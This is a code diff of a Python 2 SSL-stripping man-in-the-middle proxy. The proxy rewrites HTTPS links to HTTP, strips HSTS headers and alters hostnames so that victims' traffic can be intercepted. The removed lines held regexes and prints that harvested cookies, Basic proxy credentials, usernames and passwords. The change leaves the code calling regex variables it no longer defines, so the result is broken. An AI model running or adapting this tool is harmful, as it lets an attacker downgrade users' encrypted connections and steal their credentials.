@@ -163,8 +163,6 @@ class ProxyRequestHandler(BaseHTTPRequestHandler):
         setattr(req, 'headers', self.filter_headers(req.headers))
         try:
        	 	origin = (scheme, netloc)
-		if debug:
-			print "[+] Connection: {}://{}".format(scheme, netloc)
 	        if not origin in self.tls.conns:
 	        	if scheme == 'https':
 	                	self.tls.conns[origin] = httplib.HTTPSConnection(netloc, timeout=self.timeout)
@@ -172,10 +170,6 @@ class ProxyRequestHandler(BaseHTTPRequestHandler):
 	                    	self.tls.conns[origin] = httplib.HTTPConnection(netloc, timeout=self.timeout)
 	        conn = self.tls.conns[origin]
 	        conn.request(self.command, path, req_body, dict(req.headers))
-		if debug:
-			print "[+] Command: {}".format(self.command)
-			print "[+] Path: {}".format(path)
-			print "----------------------------------------------------------------------"
 	        res = conn.getresponse()
 	        version_table = {10: 'HTTP/1.0', 11: 'HTTP/1.1'}
 	        setattr(res, 'headers', res.msg)
@@ -194,8 +188,6 @@ class ProxyRequestHandler(BaseHTTPRequestHandler):
 
         	res_body = res.read()
         except Exception as e:
-	    if debug:
-	    	print "Exception !!! ---- > : {}".format(e)
             if origin in self.tls.conns:
                 del self.tls.conns[origin]
             self.send_error(502)
@@ -307,16 +299,9 @@ def Proxy(HandlerClass=ProxyRequestHandler, ServerClass=ThreadingHTTPServer, pro
 class SSLStripRequestHandler(ProxyRequestHandler):
     replaced_urls = deque(maxlen=1024)
     def request_handler(self, req, req_body):
-	if debug:
-		print "\n-----------------------------[Request]--------------------------------"
 	if req.headers:
 		modified = False
-		if debug:
-			print "[+] Original Headers:"
-			print req.headers
 		prefixes = ["wwww","waccounts","wmail","wbooks","wssl","wdrive","wmaps","wnews","wplay","wplus","wencrypted","wassets","wgraph","wfonts","wlogin","wsecure","wwiki","wwallet","wmyaccount","wphotos","wdocs","wlh3","wapis","wb","ws","wbr","wna","wads","wlogin","wmm","wm","wmobile","wsb"]
-                pxy_regex = '([Ww]ww-[Aa]uthorization:|[Ww]ww-[Aa]uthentication:|[Pp]roxy-[Aa]uthorization:|[Pp]roxy-[Aa]uthentication:) Basic (.*?) '
-		cookie_regex = '([Cc]okie:)(.*?)'
 		for p in prefixes:
 			for h in req.headers:
 				if p in req.headers[h]:
@@ -325,52 +310,19 @@ class SSLStripRequestHandler(ProxyRequestHandler):
 		for h in req.headers:
 			proxy = re.findall(pxy_regex, h)
 			cookie = re.findall(cookie_regex, h)
-		if cookie:
-			print "\n[$$$] Cookie found: " + str(cookie[0][1]) + "\n"
-		if proxy:
-			try:
-           			print "\n[$$$] Proxy credentials: " + str(proxy[0][1]).decode('base64') + "\n"
-                	except:
-                	        print "\n[$$$] Proxy credentials: " + str(proxy[0][1]) + "\n"
-		if debug:
-			if modified:
-				print "[+] Modified Headers:"
-				print req.headers
 	if req_body:
 		modified = False
-		if debug:
-			print "\n[+]Original Body:"
-			print req_body
 		for p in prefixes:
 			if p in req_body:
 				req_body.replace(p, p[1:])
 				modified = True
-		if debug:
-			if modified:
-				print "[+] Modified Body:"
-				print req_body
-		user_regex = '([Ee]mail|[Uu]ser|[Uu]sername|[Ll]ogin|[Ll]ogin[Ii][Dd]|[Uu]name|[Uu]suario)=([^&|;]*)'
-                pw_regex = '([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp][Ss][Ww]|[Pp]asswrd|[Pp]assw)=([^&|;]*)'
-		plain_text = str(req_body.replace("\n"," "))
-		users = re.findall(user_regex, plain_text)
-                passwords = re.findall(pw_regex, plain_text)
-                if users:
-                        print "\n[$$$] Login found: " + str(users[0][1]) + "\n"
-                if passwords:
-                        print "\n[$$$] Password found: " + str(passwords[0][1]) + "\n"
 
 
     def response_handler(self, req, req_body, res, res_body, scheme, netloc, path, method):
-	if debug:
-		print "\n----------------------------[Response]--------------------------------"
 	if res.headers:
 		modified = False
 		#Protection HSTS Header to Strip
 		hsts = 'Strict-Transport-Security'
-		if debug:
-			print "\n[+] Original Headers:"
-			print res.headers
-			print
 		for h in res.headers:
 			if "https://" in res.headers[h]:
 				res.headers[h].replace("https://","http://w")
@@ -387,15 +339,7 @@ class SSLStripRequestHandler(ProxyRequestHandler):
 			modified = True
 		except:
 			pass
-		if debug:
-			if modified:
-				print "\n[+] Modified Headers:"
-				print res.headers
-				print
 	if res_body:
-		if debug:
-			print "\n[+] Original Body:"
-			print res_body
 		if scheme == "http":
 			return res_body
 		else:
@@ -413,12 +357,7 @@ class SSLStripRequestHandler(ProxyRequestHandler):
 			except Exception as e:
 				print "Exception caught: {}".format(e)
 				res_body = res_body.replace("https://","http://w")
-		if debug:
-			print "\n[+] Modified Body:"
-			print res_body.replace("https://","http://w")
 		return res_body
-	if debug:
-		print "\n----------------------------------------------------------------------"
 
 
 class SSLKiller(object):
